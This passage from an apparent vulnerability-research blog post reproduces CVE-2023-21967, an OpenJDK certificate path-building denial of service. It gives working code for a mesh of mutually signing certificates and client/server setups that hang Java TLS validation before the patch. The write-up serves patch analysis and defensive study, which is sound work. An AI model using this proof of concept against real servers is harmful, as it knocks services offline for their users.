            <span class="n">next</span> <span class="o">=</span> <span class="nc">X509CertImpl</span><span class="o">.</span><span class="na">toImpl</span><span class="o">(</span><span class="n">nextCert</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">CertificateException</span> <span class="n">ce</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
        <span class="o">}</span>

        <span class="nc">SubjectAlternativeNameExtension</span> <span class="n">currAltNameExt</span> <span class="o">=</span>
            <span class="n">curr</span><span class="o">.</span><span class="na">getSubjectAlternativeNameExtension</span><span class="o">();</span>
        <span class="nc">SubjectAlternativeNameExtension</span> <span class="n">nextAltNameExt</span> <span class="o">=</span>
            <span class="n">next</span><span class="o">.</span><span class="na">getSubjectAlternativeNameExtension</span><span class="o">();</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">currAltNameExt</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">nextAltNameExt</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
            <span class="o">}</span>
            <span class="k">return</span> <span class="nc">Arrays</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">currAltNameExt</span><span class="o">.</span><span class="na">getExtensionValue</span><span class="o">(),</span>
                <span class="n">nextAltNameExt</span><span class="o">.</span><span class="na">getExtensionValue</span><span class="o">());</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="k">return</span> <span class="o">(</span><span class="n">nextAltNameExt</span> <span class="o">==</span> <span class="kc">null</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>
</code></pre></div>  </div>
  <figcaption>
    <p><em>src/java.base/sun/security/provider/certpath/ForwardBuilder.java</em></p>
  </figcaption>
</figure>

<p>Why would the developers make this change? After all, there are a number of reasons that two certificates may differ 
even with the same public key and subject. The introduction of the <code class="language-plaintext highlighter-rouge">repeated</code> method is purely done for path-building 
optimization. It is important to know that there are ranges of PKI structures going from simple hierarchical ones to
mesh structures. Treating such structures as directed graphs, path building can easily become a complex and resource 
exhaustive task. This is why path-building optimization is crucial for finding paths within a complex PKI 
structures.</p>

<p>Within the loop detection recommendation within <a href="https://datatracker.ietf.org/doc/html/rfc4158">RFC 4158</a>, it is 
recommended to detect the presence of certificates with the same subject name, subject alternative name, and public 
key. A certificate with the same combination of these elements should not show up twice in a valid certificate path. 
This check eliminates superfluous paths and is an optimization approach for depth-first tree traversal path building. 
<a href="https://datatracker.ietf.org/doc/html/rfc4158#section-2.4.2">Section 2.4.2 of RFC 4158</a> provides more details on
path-building optimization and the reasons behind such similar certificates detection.</p>

<h2 id="configuration">Configuration</h2>

<p>Before building a proof of concept, it is important to note two properties that affect how many paths are attempted. 
The property <code class="language-plaintext highlighter-rouge">jdk.tls.maxHandshakeMessageSize</code>, with a default value of 32768 (32 kilobytes), restricts the size of 
messages during the TLS handshake. Since an increasing number of certificates will increase the size of the 
handshake message, it in practice restricts the number of certificates we can send to the client, which the client 
could then attempt to use in path building. The property <code class="language-plaintext highlighter-rouge">jdk.tls.maxCertificateChainLength</code>, with a default value of 
10, directly limits the size of the certificate chain we can provide.<sup id="fnref:8" role="doc-noteref"><a href="#fn:8" class="footnote" rel="footnote">6</a></sup> Both properties were introduced as part of 
JDK-8245417 (still non-public) in October 2020, corresponding to versions 11.0.9+7, 1.8. 0_271-b09, and 1.7.0_281-b06.<sup id="fnref:9" role="doc-noteref"><a href="#fn:9" class="footnote" rel="footnote">7</a></sup></p>

<p>For our proof of concept to showcase the optimization changes, we’ll run the client with 
<code class="language-plaintext highlighter-rouge">-Djdk.tls.maxCertificateChainLength=100 -Djdk.tls.maxHandshakeMessageSize=98304</code>.</p>

<h2 id="proof-of-concept">Proof of Concept</h2>
<p>With the patch targeting path-building optimization, we can presumably build a proof of concept that causes 
extraneous resource intensive path building. The worst case scenario for depth first search path building is a graph 
where every node is signed by every other node, think a directed complete graph where each edge represents a 
certificate. <code class="language-plaintext highlighter-rouge">SunCertPathBuilder</code> will build a certificate path by progressing to the issuer DN of the subject 
certificate. Without the optimizations introduced by the patch, it will happily progress to an issuer DN it has 
already seen as long as the certificates are unequal. With our directed graph, we will indeed provide it multiple 
certificate options to take for a single issuer DN. Our Python script will create the certificates representing the 
directed complete graph. The number of edges, or certificates, is simply calculated by <code class="language-plaintext highlighter-rouge">n(n-1)</code>, where <code class="language-plaintext highlighter-rouge">n</code> represents 
the number of vertices in the complete graph.</p>

<details>
  <summary>Step 1 - Setup a Java Client</summary>

  <p>We will create the most basic client that attempts to establish a secure connection with our malicious server. 
Normally a vulnerability like this would be triggered the other way around, such as in mTLS, but this will satisfy 
our simple test.</p>

  <div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">javax.net.ssl.*</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">TLSTest</span> <span class="o">{</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="nc">SSLSocketFactory</span> <span class="n">factory</span> <span class="o">=</span> <span class="o">(</span><span class="nc">SSLSocketFactory</span><span class="o">)</span><span class="nc">SSLSocketFactory</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
            <span class="nc">SSLSocket</span> <span class="n">socket</span> <span class="o">=</span> <span class="o">(</span><span class="nc">SSLSocket</span><span class="o">)</span><span class="n">factory</span><span class="o">.</span><span class="na">createSocket</span><span class="o">(</span><span class="s">"localhost"</span><span class="o">,</span> <span class="mi">8080</span><span class="o">);</span>

            <span class="n">socket</span><span class="o">.</span><span class="na">startHandshake</span><span class="o">();</span>
            <span class="n">socket</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>

        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div>  </div>
</details>

<details>
  <summary>Step 2 - Setup a Python Server</summary>

  <p>We’ll use a simple Python TLS server to provide our own certificate chain. This opens up modifying the certificate chain
without the intermediate verification steps from a Java keystore.</p>

  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">http.server</span> <span class="kn">import</span> <span class="n">HTTPServer</span><span class="p">,</span> <span class="n">BaseHTTPRequestHandler</span>
<span class="kn">import</span> <span class="nn">ssl</span>

<span class="n">httpd</span> <span class="o">=</span> <span class="n">HTTPServer</span><span class="p">((</span><span class="s">'localhost'</span><span class="p">,</span> <span class="mi">8080</span><span class="p">),</span> <span class="n">BaseHTTPRequestHandler</span><span class="p">)</span>

<span class="n">httpd</span><span class="p">.</span><span class="n">socket</span> <span class="o">=</span> <span class="n">ssl</span><span class="p">.</span><span class="n">wrap_socket</span><span class="p">(</span><span class="n">httpd</span><span class="p">.</span><span class="n">socket</span><span class="p">,</span>
        <span class="n">keyfile</span><span class="o">=</span><span class="s">"certs/key.pem"</span><span class="p">,</span>
        <span class="n">certfile</span><span class="o">=</span><span class="s">'certs/full-chain.pem'</span><span class="p">,</span> 
        <span class="n">server_side</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>

<span class="n">httpd</span><span class="p">.</span><span class="n">serve_forever</span><span class="p">()</span>
</code></pre></div>  </div>
</details>

<details>
  <summary>Step 3 - Generate Malicious Certificates</summary>

  <p>The below code creates a mesh PKI structure, where every node is signed by every other node. It will generate all the 
signed certificates and private keys needed to represent this structure and output all materials in 
<code class="language-plaintext highlighter-rouge">certs/</code>. All the signed certificates will be bundled together in <code class="language-plaintext highlighter-rouge">certs/full-chain.pem</code>, 
where the first certificate in the file is the end-entity certificate.</p>

  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># May need to pip3 install cryptography
</span>
<span class="kn">import</span> <span class="nn">datetime</span>
<span class="kn">import</span> <span class="nn">itertools</span>

<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives</span> <span class="kn">import</span> <span class="n">serialization</span>
<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.asymmetric</span> <span class="kn">import</span> <span class="n">rsa</span>
<span class="kn">from</span> <span class="nn">cryptography</span> <span class="kn">import</span> <span class="n">x509</span>
<span class="kn">from</span> <span class="nn">cryptography.x509.oid</span> <span class="kn">import</span> <span class="n">NameOID</span>
<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives</span> <span class="kn">import</span> <span class="n">hashes</span>

<span class="n">CERT_PATH</span> <span class="o">=</span> <span class="s">'certs/'</span>

<span class="k">def</span> <span class="nf">generate_certificate</span><span class="p">(</span><span class="n">edge</span><span class="p">):</span>
    <span class="n">issuer</span> <span class="o">=</span> <span class="n">edge</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">subject</span> <span class="o">=</span> <span class="n">edge</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    
    <span class="n">issuer_key</span> <span class="o">=</span> <span class="n">private_keys</span><span class="p">[</span><span class="n">issuer</span><span class="p">]</span>
    <span class="n">subject_key</span> <span class="o">=</span> <span class="n">private_keys</span><span class="p">[</span><span class="n">subject</span><span class="p">]</span>
    
    <span class="n">builder</span> <span class="o">=</span> <span class="n">x509</span><span class="p">.</span><span class="n">CertificateBuilder</span><span class="p">()</span>
    <span class="n">builder</span> <span class="o">=</span> <span class="n">builder</span><span class="p">.</span><span class="n">subject_name</span><span class="p">(</span><span class="n">x509</span><span class="p">.</span><span class="n">Name</span><span class="p">([</span><span class="n">x509</span><span class="p">.</span><span class="n">NameAttribute</span><span class="p">(</span><span class="n">NameOID</span><span class="p">.</span><span class="n">COMMON_NAME</span><span class="p">,</span> <span class="n">subject</span><span class="p">)]))</span>
    <span class="n">builder</span> <span class="o">=</span> <span class="n">builder</span><span class="p">.</span><span class="n">issuer_name</span><span class="p">(</span><span class="n">x509</span><span class="p">.</span><span class="n">Name</span><span class="p">([</span><span class="n">x509</span><span class="p">.</span><span class="n">NameAttribute</span><span class="p">(</span><span class="n">NameOID</span><span class="p">.</span><span class="n">COMMON_NAME</span><span class="p">,</span> <span class="n">issuer</span><span class="p">)]))</span>
    <span class="n">builder</span> <span class="o">=</span> <span class="n">builder</span><span class="p">.</span><span class="n">not_valid_before</span><span class="p">(</span><span class="n">datetime</span><span class="p">.</span><span class="n">datetime</span><span class="p">.</span><span class="n">now</span><span class="p">(</span><span class="n">datetime</span><span class="p">.</span><span class="n">timezone</span><span class="p">.</span><span class="n">utc</span><span class="p">))</span>
    <span class="n">builder</span> <span class="o">=</span> <span class="n">builder</span><span class="p">.</span><span class="n">not_valid_after</span><span class="p">(</span><span class="n">datetime</span><span class="p">.</span><span class="n">datetime</span><span class="p">.</span><span class="n">now</span><span class="p">(</span><span class="n">datetime</span><span class="p">.</span><span class="n">timezone</span><span class="p">.</span><span class="n">utc</span><span class="p">)</span> <span class="o">+</span> <span class="n">datetime</span><span class="p">.</span><span class="n">timedelta</span><span class="p">(</span><span class="n">days</span><span class="o">=</span><span class="mi">50</span><span class="p">))</span>
    <span class="n">builder</span> <span class="o">=</span> <span class="n">builder</span><span class="p">.</span><span class="n">serial_number</span><span class="p">(</span><span class="n">x509</span><span class="p">.</span><span class="n">random_serial_number</span><span class="p">())</span>
    <span class="n">builder</span> <span class="o">=</span> <span class="n">builder</span><span class="p">.</span><span class="n">public_key</span><span class="p">(</span><span class="n">subject_key</span><span class="p">.</span><span class="n">public_key</span><span class="p">())</span>
    <span class="n">builder</span> <span class="o">=</span> <span class="n">builder</span><span class="p">.</span><span class="n">add_extension</span><span class="p">(</span><span class="n">x509</span><span class="p">.</span><span class="n">SubjectAlternativeName</span><span class="p">([</span><span class="n">x509</span><span class="p">.</span><span class="n">DNSName</span><span class="p">(</span><span class="n">subject</span><span class="p">)]),</span><span class="n">critical</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
    <span class="n">builder</span> <span class="o">=</span> <span class="n">builder</span><span class="p">.</span><span class="n">add_extension</span><span class="p">(</span><span class="n">x509</span><span class="p">.</span><span class="n">BasicConstraints</span><span class="p">(</span><span class="n">ca</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">path_length</span><span class="o">=</span><span class="bp">None</span><span class="p">),</span> <span class="n">critical</span><span class="o">=</span><span class="bp">True</span><span class="p">,)</span> <span class="c1"># Everyone gets to be a CA!
</span>    <span class="n">builder</span> <span class="o">=</span> <span class="n">builder</span><span class="p">.</span><span class="n">add_extension</span><span class="p">(</span>
        <span class="n">x509</span><span class="p">.</span><span class="n">KeyUsage</span><span class="p">(</span>
            <span class="n">digital_signature</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> 
            <span class="n">key_encipherment</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> 
            <span class="n">key_cert_sign</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span>
            <span class="n">key_agreement</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> 
            <span class="n">content_commitment</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> 
            <span class="n">data_encipherment</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span>                   
            <span class="n">crl_sign</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> 
            <span class="n">encipher_only</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> 
            <span class="n">decipher_only</span><span class="o">=</span><span class="bp">False</span><span class="p">),</span> 
        <span class="n">critical</span><span class="o">=</span><span class="bp">False</span>
        <span class="p">)</span>

    <span class="n">certificate</span> <span class="o">=</span> <span class="n">builder</span><span class="p">.</span><span class="n">sign</span><span class="p">(</span><span class="n">issuer_key</span><span class="p">,</span> <span class="n">hashes</span><span class="p">.</span><span class="n">SHA256</span><span class="p">())</span>

    <span class="n">cert_graph_certs</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">certificate</span><span class="p">.</span><span class="n">public_bytes</span><span class="p">(</span><span class="n">serialization</span><span class="p">.</span><span class="n">Encoding</span><span class="p">.</span><span class="n">PEM</span><span class="p">))</span>

    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">CERT_PATH</span> <span class="o">+</span> <span class="n">subject</span> <span class="o">+</span> <span class="s">"-signed-by-"</span> <span class="o">+</span> <span class="n">issuer</span> <span class="o">+</span> <span class="s">".pem"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">certificate</span><span class="p">.</span><span class="n">public_bytes</span><span class="p">(</span><span class="n">serialization</span><span class="p">.</span><span class="n">Encoding</span><span class="p">.</span><span class="n">PEM</span><span class="p">))</span>

<span class="n">vertex_count</span> <span class="o">=</span> <span class="mi">10</span>
<span class="n">cert_graph</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">itertools</span><span class="p">.</span><span class="n">permutations</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="n">vertex_count</span><span class="p">)),</span> <span class="mi">2</span><span class="p">))</span>
<span class="n">cert_graph</span> <span class="o">=</span> <span class="p">[(</span><span class="nb">str</span><span class="p">(</span><span class="n">edge</span><span class="p">[</span><span class="mi">0</span><span class="p">]),</span><span class="nb">str</span><span class="p">(</span><span class="n">edge</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="k">for</span> <span class="n">edge</span> <span class="ow">in</span> <span class="n">cert_graph</span><span class="p">]</span>

<span class="n">unique_vertex</span> <span class="o">=</span> <span class="p">[]</span>

<span class="c1"># Get Unique Vertex
</span><span class="k">for</span> <span class="n">edge</span> <span class="ow">in</span> <span class="n">cert_graph</span><span class="p">:</span>
    <span class="k">if</span> <span class="n">edge</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">unique_vertex</span><span class="p">:</span>
        <span class="n">unique_vertex</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">edge</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="k">if</span> <span class="n">edge</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">unique_vertex</span><span class="p">:</span>
        <span class="n">unique_vertex</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">edge</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>

<span class="n">private_keys</span> <span class="o">=</span> <span class="p">{}</span>
<span class="n">selfsigned_certs</span> <span class="o">=</span> <span class="p">{}</span>

<span class="c1"># Generate Private Key and Self Signed Certificates for every Vertex
</span><span class="k">for</span> <span class="n">vertex</span> <span class="ow">in</span> <span class="n">unique_vertex</span><span class="p">:</span>
    <span class="n">key</span> <span class="o">=</span> <span class="n">rsa</span><span class="p">.</span><span class="n">generate_private_key</span><span class="p">(</span>
        <span class="n">public_exponent</span><span class="o">=</span><span class="mi">65537</span><span class="p">,</span>
        <span class="n">key_size</span><span class="o">=</span><span class="mi">2048</span>
    <span class="p">)</span>

    <span class="c1"># Write private key
</span>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">CERT_PATH</span> <span class="o">+</span> <span class="n">vertex</span> <span class="o">+</span> <span class="s">"-key.pem"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">key</span><span class="p">.</span><span class="n">private_bytes</span><span class="p">(</span>
            <span class="n">encoding</span><span class="o">=</span><span class="n">serialization</span><span class="p">.</span><span class="n">Encoding</span><span class="p">.</span><span class="n">PEM</span><span class="p">,</span>
            <span class="nb">format</span><span class="o">=</span><span class="n">serialization</span><span class="p">.</span><span class="n">PrivateFormat</span><span class="p">.</span><span class="n">TraditionalOpenSSL</span><span class="p">,</span>
            <span class="n">encryption_algorithm</span><span class="o">=</span><span class="n">serialization</span><span class="p">.</span><span class="n">NoEncryption</span><span class="p">()</span>
        <span class="p">))</span>

    <span class="c1"># Create self-signed certificate
</span>    <span class="n">builder</span> <span class="o">=</span> <span class="n">x509</span><span class="p">.</span><span class="n">CertificateBuilder</span><span class="p">()</span>
    <span class="n">builder</span> <span class="o">=</span> <span class="n">builder</span><span class="p">.</span><span class="n">subject_name</span><span class="p">(</span><span class="n">x509</span><span class="p">.</span><span class="n">Name</span><span class="p">([</span><span class="n">x509</span><span class="p">.</span><span class="n">NameAttribute</span><span class="p">(</span><span class="n">NameOID</span><span class="p">.</span><span class="n">COMMON_NAME</span><span class="p">,</span> <span class="n">vertex</span><span class="p">)]))</span>
    <span class="n">builder</span> <span class="o">=</span> <span class="n">builder</span><span class="p">.</span><span class="n">issuer_name</span><span class="p">(</span><span class="n">x509</span><span class="p">.</span><span class="n">Name</span><span class="p">([</span><span class="n">x509</span><span class="p">.</span><span class="n">NameAttribute</span><span class="p">(</span><span class="n">NameOID</span><span class="p">.</span><span class="n">COMMON_NAME</span><span class="p">,</span> <span class="n">vertex</span><span class="p">)]))</span>
    <span class="n">builder</span> <span class="o">=</span> <span class="n">builder</span><span class="p">.</span><span class="n">not_valid_before</span><span class="p">(</span><span class="n">datetime</span><span class="p">.</span><span class="n">datetime</span><span class="p">.</span><span class="n">now</span><span class="p">(</span><span class="n">datetime</span><span class="p">.</span><span class="n">timezone</span><span class="p">.</span><span class="n">utc</span><span class="p">))</span>
    <span class="n">builder</span> <span class="o">=</span> <span class="n">builder</span><span class="p">.</span><span class="n">not_valid_after</span><span class="p">(</span><span class="n">datetime</span><span class="p">.</span><span class="n">datetime</span><span class="p">.</span><span class="n">now</span><span class="p">(</span><span class="n">datetime</span><span class="p">.</span><span class="n">timezone</span><span class="p">.</span><span class="n">utc</span><span class="p">)</span> <span class="o">+</span> <span class="n">datetime</span><span class="p">.</span><span class="n">timedelta</span><span class="p">(</span><span class="n">days</span><span class="o">=</span><span class="mi">50</span><span class="p">))</span>
    <span class="n">builder</span> <span class="o">=</span> <span class="n">builder</span><span class="p">.</span><span class="n">serial_number</span><span class="p">(</span><span class="n">x509</span><span class="p">.</span><span class="n">random_serial_number</span><span class="p">())</span>
    <span class="n">builder</span> <span class="o">=</span> <span class="n">builder</span><span class="p">.</span><span class="n">public_key</span><span class="p">(</span><span class="n">key</span><span class="p">.</span><span class="n">public_key</span><span class="p">())</span>
    <span class="n">builder</span> <span class="o">=</span> <span class="n">builder</span><span class="p">.</span><span class="n">add_extension</span><span class="p">(</span><span class="n">x509</span><span class="p">.</span><span class="n">SubjectAlternativeName</span><span class="p">([</span><span class="n">x509</span><span class="p">.</span><span class="n">DNSName</span><span class="p">(</span><span class="n">vertex</span><span class="p">)]),</span><span class="n">critical</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
    <span class="n">builder</span> <span class="o">=</span> <span class="n">builder</span><span class="p">.</span><span class="n">add_extension</span><span class="p">(</span><span class="n">x509</span><span class="p">.</span><span class="n">BasicConstraints</span><span class="p">(</span><span class="n">ca</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">path_length</span><span class="o">=</span><span class="bp">None</span><span class="p">),</span> <span class="n">critical</span><span class="o">=</span><span class="bp">True</span><span class="p">,)</span>

    <span class="n">certificate</span> <span class="o">=</span> <span class="n">builder</span><span class="p">.</span><span class="n">sign</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">hashes</span><span class="p">.</span><span class="n">SHA256</span><span class="p">())</span>

    <span class="n">private_keys</span><span class="p">[</span><span class="n">vertex</span><span class="p">]</span> <span class="o">=</span> <span class="n">key</span>
    <span class="n">selfsigned_certs</span><span class="p">[</span><span class="n">vertex</span><span class="p">]</span> <span class="o">=</span> <span class="n">certificate</span> 
    
    <span class="c1"># Write self-signed certificates
</span>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">CERT_PATH</span> <span class="o">+</span> <span class="n">vertex</span> <span class="o">+</span> <span class="s">"-ss.pem"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">certificate</span><span class="p">.</span><span class="n">public_bytes</span><span class="p">(</span><span class="n">serialization</span><span class="p">.</span><span class="n">Encoding</span><span class="p">.</span><span class="n">PEM</span><span class="p">))</span>

<span class="n">cert_graph_certs</span> <span class="o">=</span> <span class="p">[]</span>

<span class="k">for</span> <span class="n">edge</span> <span class="ow">in</span> <span class="n">cert_graph</span><span class="p">:</span>
    <span class="n">generate_certificate</span><span class="p">(</span><span class="n">edge</span><span class="p">)</span>

<span class="c1"># Bundle and write all signed certificates together
</span><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">CERT_PATH</span> <span class="o">+</span> <span class="s">"full-chain.pem"</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">cert</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="n">cert_graph_certs</span><span class="p">):</span>
        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">cert</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'UTF-8'</span><span class="p">))</span>
</code></pre></div>  </div>

  <p>To start, we’ll have it create the structure for ten nodes all signed by each other, defined in the variable
<code class="language-plaintext highlighter-rouge">vertex_count</code>. We’ll run this file, expecting 90 certificates to be created.</p>

  <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">mkdir </span>certs
<span class="nv">$ </span>pip3 <span class="nb">install </span>cryptography
<span class="nv">$ </span>python3 cert-helper.py
</code></pre></div>  </div>

</details>

<details>
  <summary>Step 4 - Run Python Server </summary>

  <p>The path to all of the signed certificates and end-entity private key will need to be specified to the Python Server
created in Step 2. We can then run the server.</p>

  <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 https-server.py
</code></pre></div>  </div>

</details>

<details>
  <summary>Step 5 - Run Payload Pre-Patch (OpenJDK 11.0.18)</summary>

  <p>To showcase optimization differences better, we’ll run our Java client with <code class="language-plaintext highlighter-rouge">jdk.tls.maxCertificateChainLength</code> and 
<code class="language-plaintext highlighter-rouge">jdk.tls.maxHandshakeMessageSize</code> set to non-default values.</p>

  <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>java <span class="nt">-Djdk</span>.tls.maxCertificateChainLength<span class="o">=</span>100 <span class="nt">-Djdk</span>.tls.maxHandshakeMessageSize<span class="o">=</span>98304 TLSTest.java
</code></pre></div>  </div>

  <p>There will be a noticeable hang, about 15 seconds, as the client attempts to validate the certificate path provided by 
the server, which is the denial of service condition. If we then run this program under a debugger and set a 
breakpoint in <code class="language-plaintext highlighter-rouge">SunCertPathBuilder::PKIXCertPathBuilderResult</code>, we can see the size of the 
<code class="language-plaintext highlighter-rouge">AdjacencyList</code> used to store the history of certification paths attempted in constructing a path from an 
initiator to a target.</p>

  <div style="text-align: center;">
    <p><img src="/assets/images/posts/openjdk-vuln-reproduction-CVE-2023-21967/before-run.png" alt="" /></p>
  </div>

  <p>The client will of course fail to validate a certificate path since the server did not provide a path with a trust 
anchor in the client truststore.</p>
</details>

<details>
  <summary>Step 6 - Run Payload Post-Patch (OpenJDK 11.0.19)</summary>

  <p>We’ll run the Java client with same non-default settings.</p>

  <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>java <span class="nt">-Djdk</span>.tls.maxCertificateChainLength<span class="o">=</span>100 <span class="nt">-Djdk</span>.tls.maxHandshakeMessageSize<span class="o">=</span>98304 TLSTest.java
</code></pre></div>  </div>

  <p>In the debugger, we can see the <code class="language-plaintext highlighter-rouge">AdjacencyList</code> is significantly smaller than in the pre-patch example.</p>

  <div style="text-align: center;">
    <p><img src="/assets/images/posts/openjdk-vuln-reproduction-CVE-2023-21967/after-run.png" alt="" /></p>
  </div>

</details>

<h2 id="proof-of-concept---client-authentication">Proof of Concept - Client Authentication</h2>

<p>Of course, a web server causing a denial of service condition for clients is fairly pointless and unrealistic. A 
more interesting scenario is in the case of mutual authentication where the client also provides a certificate chain 
for the server to verify. A denial of service condition here would cause the server to appear to be down for other 
clients attempting to connect.</p>

<details>
  <summary>Step 1 - Setup a Java Server</summary>

  <p>We’ll use the Java server provided in the <a href="https://docs.oracle.com/javase/8/docs/technotes/guides/security/jsse/samples/sockets/server/ClassFileServer.java">sample JSSE code</a>.
I won’t copy the instructions verbatim, as the documentation walks through the sample code <a href="https://docs.oracle.com/javase/8/docs/technotes/guides/security/jsse/JSSERefGuide.html#SampleCode">here</a>.
We can run the server as instructed below, with our properties set to non-default values again.</p>

  <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>javac ClassFileServer.java 
<span class="nv">$ </span>java <span class="nt">-Djdk</span>.tls.maxCertificateChainLength<span class="o">=</span>100 <span class="nt">-Djdk</span>.tls.maxHandshakeMessageSize<span class="o">=</span>98304 ClassFileServer 8080 /Users/sam.shahsavar/ TLS <span class="nb">true</span>
</code></pre></div>  </div>

</details>

<details>
  <summary>Step 2 - Setup a Python Client</summary>

  <p>We will setup a Python client that will provide the certificates generated by our tool in the above section. We’re 
not going to bother verifying the certificate from the server since it is irrelevant to the malicious client.</p>

  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">result</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span>
    <span class="s">'https://localhost:8080/test.txt'</span><span class="p">,</span>
    <span class="n">cert</span><span class="o">=</span><span class="p">(</span><span class="s">'/certs/full-chain.pem'</span><span class="p">,</span> <span class="s">'/certs/key.pem'</span><span class="p">),</span>
    <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
</code></pre></div>  </div>

</details>

<details>
  <summary>Step 3 - Run Python Client</summary>

  <p>We will then simply run the Python client.</p>

  <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 client.py
</code></pre></div>  </div>

  <p>There will again be a noticeable hang. If we setup a debugger for <code>ClassFileServer.java</code>, we see similar 
results to the previous example.</p>

  <div style="text-align: center;">
    <p><img src="/assets/images/posts/openjdk-vuln-reproduction-CVE-2023-21967/before-run.png" alt="" /></p>
  </div>

</details>

<h2 id="further-tests">Further Tests</h2>

<p>The chart below documents the results from a variety of scenarios with our proof of concept, configured from three to 
twenty nodes. The patch succeeds in substantial optimizations, especially as the scenarios get more ludicrous.</p>

<table>
  <thead>
    <tr>
      <th style="text-align: right">Nodes</th>
      <th style="text-align: right">Certificate Chain Length</th>
      <th style="text-align: right">Pre-Patch Time (ms)</th>
      <th style="text-align: right">Post-Patch Time (ms)</th>
      <th style="text-align: right">Pre-Patch AdjacencyList</th>
      <th style="text-align: right">Post-Patch AdjacencyList</th>
